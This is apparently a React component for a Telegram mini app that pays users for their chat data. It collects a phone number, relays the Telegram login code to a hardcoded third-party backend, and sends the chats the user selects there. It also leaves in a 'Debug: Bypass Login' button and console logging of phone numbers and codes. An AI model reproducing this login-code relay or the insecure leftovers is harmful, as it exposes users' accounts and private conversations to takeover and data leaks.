import React, { useState, useEffect } from "react";
import {
  Button,
  Input,
  Checkbox,
  Placeholder,
  PinInput,
} from "@telegram-apps/telegram-ui";
import ChatTable from "./ChatTable";

const Chats: React.FC = () => {
  const [isLoggedIn, setIsLoggedIn] = useState(false);
  const [phone, setPhone] = useState("");
  const [pin, setPin] = useState<number[]>([]);
  const [isPhoneSubmitted, setIsPhoneSubmitted] = useState(false);
  const [agreed, setAgreed] = useState(false);
  const [responseMessage, setResponseMessage] = useState<string | null>(null);
  const [selectedChats, setSelectedChats] = useState<string[]>([]);
  const [isLoading, setIsLoading] = useState(false);

  const backendUrl =
    import.meta.env.VITE_BACKEND_URL ||
    "https://daniilbot-k9qlu.ondigitalocean.app";

  const handleInputChange = (event: React.ChangeEvent<HTMLInputElement>) => {
    setPhone(event.target.value);
  };

  const handlePinChange = (value: number[]) => {
    setPin(value);
    console.log("Pin input:", value);
  };

  useEffect(() => {
    if (pin.length === 5) {
      verifyCode();
    }
  }, [pin]);

  const sendPhoneNumber = async () => {
    try {
      console.log("Sending phone number:", phone);
      const response = await fetch(`${backendUrl}/send-code`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({ phone_number: phone }),
      });

      if (!response.ok) {
        const errorMessage = await response.text();
        console.error("Error message:", errorMessage);
        throw new Error(errorMessage);
      }

      setIsPhoneSubmitted(true);
      setResponseMessage("Verification code sent. Please check your phone.");
      console.log("Verification code sent successfully");
    } catch (error) {
      console.error("Error sending phone number:", error);
      setResponseMessage("Error sending phone number");
    }
  };

  const verifyCode = async () => {
    try {
      const pinString = pin.join(""); // Convert the array of numbers to a single string
      console.log("Verifying code:", pinString);
      const response = await fetch(`${backendUrl}/login`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          phone_number: phone,
          code: pinString,
        }),
      });

      if (!response.ok) {
        const errorMessage = await response.text();
        console.error("Error message:", errorMessage);
        throw new Error(errorMessage);
      }

      const data = await response.json();
      console.log("Verification successful:", data);
      setResponseMessage(data.message || "Success");
      setIsLoggedIn(true);
    } catch (error) {
      console.error("Error verifying code:", error);
      setResponseMessage("Error verifying code");
    }
  };

  const handleChatSelectionChange = (selected: string[]) => {
    setSelectedChats(selected);
  };

  const handleMonetize = async () => {
    setIsLoading(true);
    try {
      const response = await fetch(`${backendUrl}/send-message`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({ selected_chats: selectedChats }),
      });

      if (!response.ok) {
        const errorMessage = await response.text();
        console.error("Error message:", errorMessage);
        throw new Error(errorMessage);
      }

      const data = await response.json();
      console.log("Chats sent successfully:", data);
      setResponseMessage(data.message || "Chats sent successfully");
    } catch (error) {
      console.error("Error sending chats:", error);
      setResponseMessage("Error sending chats");
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <div
      style={{
        padding: "20px",
        maxWidth: "400px",
        margin: "auto",
        textAlign: "center",
      }}
    >
      {!isLoggedIn ? (
        <>
          {!isPhoneSubmitted ? (
            <>
              <Placeholder
                description="Please log in to continue"
                header="Login"
              />
              <Input
                header="Phone Number"
                placeholder="Enter your phone number"
                value={phone}
                onChange={handleInputChange}
              />
              <Placeholder>
                <div style={{ display: "flex", alignItems: "center" }}>
                  <Checkbox
                    checked={agreed}
                    onChange={() => setAgreed(!agreed)}
                  />
                  <span>
                    I agree to the{" "}
                    <a
                      href="https://static1.squarespace.com/static/665b166b65c61d1f819dec7e/t/665c43d3be949513ba28488c/1717322707955/USER+AGREEMENT.pdf"
                      target="_blank"
                      rel="noopener noreferrer"
                    >
                      terms and conditions
                    </a>
                    .
                  </span>
                </div>
              </Placeholder>
              <Button onClick={sendPhoneNumber} size="m" disabled={!agreed}>
                Submit
              </Button>
            </>
          ) : (
            <>
              <Placeholder
                description="Enter the code sent to your phone"
                header="Verification Code"
              />
              <PinInput pinCount={5} onChange={handlePinChange} />
            </>
          )}
          {responseMessage && (
            <p className="mt-4 text-white">{responseMessage}</p>
          )}
          {/* Debug button to bypass login */}
          <Button
            onClick={() => setIsLoggedIn(true)}
            size="m"
            style={{ marginTop: "20px", backgroundColor: "red" }}
          >
            Debug: Bypass Login
          </Button>
        </>
      ) : (
        <div>
          <h2>Your data, your consent, your money</h2>
          <ChatTable onSelectionChange={handleChatSelectionChange} />
          <Button onClick={handleMonetize} size="m" disabled={isLoading}>
            {isLoading ? "Processing..." : "Claim $WORD"}
          </Button>
        </div>
      )}
    </div>
  );
};

export default Chats;
